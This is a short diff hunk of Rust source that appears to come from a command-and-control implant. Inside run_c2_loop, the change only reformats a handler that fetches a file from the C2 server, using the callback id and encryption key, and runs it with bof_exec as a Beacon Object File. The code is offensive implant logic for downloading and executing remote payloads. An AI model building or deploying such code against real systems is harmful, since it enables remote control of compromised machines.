@@ -1311,18 +1311,20 @@ pub fn run_c2_loop<F, B>(
                 let entrypoint = extract_param(&task.parameters, "entrypoint");
                 let args_spec = extract_param(&task.parameters, "args");
                 let output = run_safely(&task.id, || {
-                    CommandOutput::text(match fetch_file_bytes(
-                        &client,
-                        &base,
-                        uri,
-                        &callback_id,
-                        &encryption_key,
-                        &task.id,
-                        &file_id,
-                    ) {
-                        Ok(bytes) => bof_exec(&bytes, &entrypoint, &args_spec),
-                        Err(e) => format!("[-] bof fetch failed: {}", e),
-                    })
+                    CommandOutput::text(
+                        match fetch_file_bytes(
+                            &client,
+                            &base,
+                            uri,
+                            &callback_id,
+                            &encryption_key,
+                            &task.id,
+                            &file_id,
+                        ) {
+                            Ok(bytes) => bof_exec(&bytes, &entrypoint, &args_spec),
+                            Err(e) => format!("[-] bof fetch failed: {}", e),
+                        },
+                    )
                 })
                 .text;
                 let is_error = output.starts_with("[-]");
